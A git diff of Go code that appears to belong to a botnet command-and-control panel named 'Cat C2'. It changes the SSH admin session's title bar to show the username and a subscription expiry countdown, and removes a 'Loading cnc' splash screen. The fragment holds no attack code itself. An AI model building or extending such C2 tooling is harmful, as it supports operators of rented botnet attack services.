@@ -1,9 +1,11 @@
 package main
 
 import (
+	"fmt"
 	"github.com/gliderlabs/ssh"
 	"golang.org/x/crypto/ssh/terminal"
 	"math/rand"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -23,21 +25,21 @@ func (this *Admin) Handle() {
 	defer func() {
 		this.conn.Write([]byte("\033[?1049l"))
 	}()
-
 	var userInfo AccountInfo
 	userInfo = database.GetAccountInfo(this.conn.User())
-
 	this.conn.Write([]byte("\r\n\033[0m"))
-
-	this.conn.Write([]byte("\033[2J\033[1;1H"))
-	this.SendMessage("\033[97mLoading cnc...", true)
-	time.Sleep(500 * time.Millisecond)
-
 	go func() {
-		i := 0
 		for {
 			time.Sleep(time.Second)
-			this.SetTitle("yes")
+			var expiryString = ""
+			i, err := strconv.ParseInt("1645813852", 10, 64)
+			if err != nil {
+				expiryString = "Error"
+			} else {
+				var timee = time.Until(time.Unix(i, 0))
+				expiryString = fmt.Sprintf("%dh %dm", int64(timee.Hours()), int64(timee.Minutes()))
+			}
+			this.SetTitle("Cat C2 | User: [" + userInfo.username + "] | Expiry: [" + expiryString + "]")
 			i++
 		}
 	}()
